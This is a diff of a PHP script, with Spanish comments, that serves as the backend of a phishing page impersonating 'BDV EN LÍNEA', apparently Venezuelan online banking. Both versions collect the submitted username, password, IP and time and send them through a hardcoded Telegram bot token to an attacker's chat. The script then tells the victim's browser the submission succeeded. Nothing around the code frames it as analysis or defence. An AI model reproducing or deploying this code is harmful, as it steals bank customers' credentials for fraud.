@@ -1,36 +1,49 @@
 <?php
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
-error_reporting(0);
 
-$usuario = $_POST['usuario'];
-$password = $_POST['password'];
-$ip = $_SERVER['REMOTE_ADDR'];
-$fecha = date('Y-m-d H:i:s');
+// Verificar que sea una petición POST
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    
+    // Recibir datos
+    $usuario = isset($_POST['usuario']) ? $_POST['usuario'] : 'no data';
+    $password = isset($_POST['password']) ? $_POST['password'] : 'no data';
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $fecha = date('Y-m-d H:i:s');
 
-$token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
-$chat_id = "6912929677";
+    // Configuración Telegram
+    $token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
+    $chat_id = "6912929677";
 
-$mensaje = "🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n";
-$mensaje .= "👤 Usuario: $usuario\n";
-$mensaje .= "🔑 Clave: $password\n";
-$mensaje .= "🌐 IP: $ip\n";
-$mensaje .= "📅 Fecha: $fecha\n";
-$mensaje .= "\n═══════════════════\n";
+    // Crear mensaje
+    $mensaje = "🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n";
+    $mensaje .= "👤 Usuario: $usuario\n";
+    $mensaje .= "🔑 Clave: $password\n";
+    $mensaje .= "🌐 IP: $ip\n";
+    $mensaje .= "📅 Fecha: $fecha\n";
+    $mensaje .= "\n═══════════════════\n";
 
-// Método alternativo para enviar a Telegram
-$url = "https://api.telegram.org/bot$token/sendMessage";
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-    'chat_id' => $chat_id,
-    'text' => $mensaje,
-    'parse_mode' => 'HTML'
-]));
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$response = curl_exec($ch);
-curl_close($ch);
+    // Enviar a Telegram
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $data = array(
+        'chat_id' => $chat_id,
+        'text' => $mensaje,
+        'parse_mode' => 'HTML'
+    );
 
-echo json_encode(["success" => true]);
+    // Hacer la petición a Telegram
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    // Responder al cliente
+    echo json_encode(["success" => true]);
+} else {
+    // Si no es POST, responder error
+    echo json_encode(["success" => false, "error" => "Método no permitido"]);
+}
 ?> 
